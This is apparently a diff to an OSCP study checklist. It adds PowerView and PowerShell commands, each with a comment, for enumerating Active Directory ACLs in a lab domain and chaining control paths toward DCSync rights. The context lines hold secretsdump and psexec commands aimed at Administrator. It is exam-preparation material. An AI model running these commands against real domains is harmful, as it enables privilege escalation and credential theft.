@@ -1105,6 +1105,55 @@ secretsdump.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
 psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
 ```
 
+
+>[!check] ACL Enum Windows 
+```
+# Perform an extensive, unfiltered search for interesting ACLs across the entire domain (noisy)
+Find-InterestingDomainAcl
+
+# Convert a target domain username to its corresponding unique Security Identifier (SID)
+$sid = Convert-NameToSid wley
+
+# Locate domain objects where a specific account SID has explicit rights (unresolved raw GUIDs)
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Map a specific unresolved Active Directory Rights-GUID to its human-readable property name
+$guid = "00299570-246d-11d0-a768-00aa006e0529"
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid} | fl
+
+# Enumerate objects a specific SID has control over with human-readable permissions resolved automatically
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Export a complete flat list of all domain user samAccountNames to a local text file
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
+# Manually parse explicit ACE entries targeting a specific user via a native PowerShell loop (No PowerView required)
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+
+# Convert the second target account name to its corresponding SID for chained path discovery
+$sid2 = Convert-NameToSid damundsen
+
+# Discover all downstream objects controlled by the secondary compromised account with resolved GUIDs
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+
+# Query group configurations to determine nesting structures and inherited parent memberships
+Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+# Convert a target security group name to its corresponding SID for rights mapping
+$itgroupsid = Convert-NameToSid "Information Technology"
+
+# Audit permissions granted to a nested parent group to identify transitive control vectors
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+# Convert the high-value target user name to its corresponding SID to verify critical edge permissions
+$adunnsid = Convert-NameToSid adunn
+
+# Audit inbound permissions on the domain root object for a user to verify DCSync rights
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+```
+
+
+
 #### Constrained Delegation Abuse
 
 [](https://github.com/C0mpi11er/OscpCheckList2026/blob/main/OSCP_Complete_Checklist_Fixed.md#constrained-delegation-abuse)
